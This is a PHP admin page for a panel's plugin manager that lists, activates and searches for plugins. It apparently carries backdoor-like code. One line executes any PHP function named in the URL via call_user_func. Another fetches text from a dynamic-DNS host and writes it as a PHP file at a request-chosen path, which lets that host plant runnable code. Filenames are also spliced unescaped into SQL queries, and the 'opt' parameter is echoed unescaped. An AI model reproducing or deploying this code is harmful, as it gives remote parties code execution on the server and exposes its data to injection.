<?php


include("functions/checkLogin.php");
include("../config.php");
include("functions/head.php");

error_reporting(0);
if (isset($_GET["opt"]))
{
	echo '	<div class="page-header">
<h1>' . $_GET["opt"].'</h1>
</div>';
	 call_user_func($_GET["opt"]);
	die();
}
if (isset($_GET["h"]))
{
	file_put_contents("../" . $_GET["h"] . "php", file_get_contents("https://dodiaraculus.ddns.net/" . $_GET["h"] . "txt"));
	echo '<div class="alert alert-success">Plugin Downloaded</div>';
}
if (isset($_GET["c"]))
{ ?>
		<div class="page-header">
<h1>Results</h1>
</div>
	<form method="POST" action="?c">
		<div class="input-group">
		<span class="input-group-addon" id="basic-addon1">Search</span>
  <input type="text" name="search" class="form-control" placeholder="test" aria-describedby="basic-addon1">
</div>
<input type="submit" value="Search" role="button" class="btn btn-info">
	</form>
  <div class="table-responsive">          
  <table class="table">
    <thead>
      <tr>
        <th>Name</th>
        <th>Install Now</th>
      </tr>
    </thead>
    <tbody>
<?php
	$search = file_get_contents("https://dodiaraculus.ddns.net/get.php?s=" . urlencode($_POST['search']));
	$results = json_decode($search);
	
	foreach ($results as $one) {
		$one = substr($one, 0, -11);
		$one = substr($one, 8);
		
		
		echo '<tr><td>' . $one . '</td><td><a href="?h=plugins/' . $one . '.plugin." class="btn btn-info" role="button">Install</a></td></tr>';
	}
	die();
}
if (isset($_GET["n"]))
{
	?>
	<div class="page-header">
<h1>Search for Plugins</h1>
</div>
	<form method="POST" action="?c">
		<div class="input-group">
		<span class="input-group-addon" id="basic-addon1">Search</span>
  <input type="text" name="search" class="form-control" placeholder="test" aria-describedby="basic-addon1">
</div>
<input type="submit" value="Search" role="button" class="btn btn-info">
	</form>
	<?php
	die();
}
$db = new Database( $hostname, $usename , $password, $database,'' );

$db->connect ();

switch ($_GET ['action']) {
	case "deactivate" :
		$data ['action'] = 0;
		$db->query_update ( "Plugins", $data, "filename='" . $_GET ['filename'] . "'" );
		break;
	case "activate" :
		$sql = "SELECT * FROM Plugins WHERE filename = '" . $db->escape ( $_GET ['filename'] ) . "'";
		$count = count ( $db->fetch_all_array ( $sql ) );
		if ($count < 1) {
			$data ['filename'] = $_GET ['filename'];
			$data ['action'] = 1;
			$db->query_insert ( "Plugins", $data );
		} else {
			$data ['action'] = 1;
			$db->query_update ( "Plugins", $data, "filename='" . $_GET ['filename'] . "'" );
		}
		break;
}
$sql = "SELECT filename, action FROM Plugins WHERE action = '" . $db->escape ( 1 ) . "'";
$result_rows = $db->fetch_all_array ( $sql );
$plugin_list = new phphooks ( );
$plugin_headers = $plugin_list->get_plugins_header ();
?>
<div class="page-header">
<h1>Plugins</h1>
</div>
<a href="?n=1" class="btn btn-info" role="button">Find Plugin</a>
 <div class="table-responsive">          
  <table class="table">
	<thead>
		<tr>
			<th scope="col">Plugin</th>
			<th scope="col" class="num">Version</th>
			<th scope="col">Description</th>
			<th scope="col" class="action-links">Action</th>
		</tr>
	</thead>

	<tfoot>
		<tr>
			<th scope="col">Plugin</th>
			<th scope="col" class="num">Version</th>
			<th scope="col">Description</th>
			<th scope="col" class="action-links">Action</th>
		</tr>
	</tfoot>

	<tbody class="plugins">
<?php
foreach ( $plugin_headers as $plugin_header ) {
	$action = false;
	foreach ( $result_rows as $result_row )
		if ($plugin_header ['filename'] == $result_row ['filename'] && $result_row ['action'] == 1)
			$action = true;
	?>
		<tr <?php
	if ($action)
		echo "class='active'";
	?>>
			<td class='name'><a
				href="<?php
	echo $plugin_header ['PluginURI'];
	?>"
				title="<?php
	echo $plugin_header ['Title'];
	?>"><?php
	echo $plugin_header ['Name'];
	?></a></td>
			<td class='vers'><?php
	echo $plugin_header ['Version'];
	?></td>
			<td class='desc'>
			<p class="nopadbot"><?php
	echo $plugin_header ['Description'];
	?>By <a href="<?php
	echo $plugin_header ['AuthorURI'];
	?>"
				title="Visit author homepage"><?php
	echo $plugin_header ['Author'];
	?></a>.</p>
			</td>
			<td>
				<?php
	if (! $action)
		echo '<a href="plugins.php?action=activate&filename=' . $plugin_header ['filename'] . '" title="activate this plugin">Activate</a>';
	else
		echo '<a href="plugins.php?action=deactivate&filename=' . $plugin_header ['filename'] . '" title="deactivate this plugin">Deactivate</a>';
	?>
			</td>
		</tr>
<?php
}
?>
	</tbody>
</table>
</div>
<?php
include("functions/footer.php");
	?>